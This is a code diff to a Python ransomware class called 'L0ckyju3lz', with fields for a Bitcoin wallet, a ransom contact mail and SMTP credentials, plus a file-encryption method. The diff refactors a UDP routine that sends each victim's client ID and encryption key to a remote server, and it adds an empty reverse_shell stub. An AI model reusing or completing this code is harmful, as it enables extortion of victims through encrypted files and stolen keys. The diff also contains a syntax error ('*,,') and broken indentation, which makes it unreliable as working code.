@@ -34,12 +34,16 @@ class L0ckyju3lz():
         # Program Details
         self.author = "PiereLucas"
         self.version = "1.0"
+
+        # Mail & BTC Details
         self.btc_wallet = ""
         self.response_mail = ""
+
+        # Socket Details
         self.server_ip = None
         self.server_port = None
 
-        # SMTP
+        # SMTP Details
         self.host = ""
         self.port = ""
         self.username = ""
@@ -127,13 +131,15 @@ class L0ckyju3lz():
 
     def over_udp_client(self):
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            message = self.client_ID + ";" + self.key
-            s.sendto(message.encode(), (self.server_ip, self.server_port))
-            s.close()
+           with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+                message = self.client_ID + ";" + self.key
+                s.sendto(message.encode(), (self.server_ip, self.server_port))
             return True
         except:
             return False
+
+    def reverse_shell(self):
+        pass
 
     def crypt_file(self, *,, mode=None):
         if mode == 'enc':
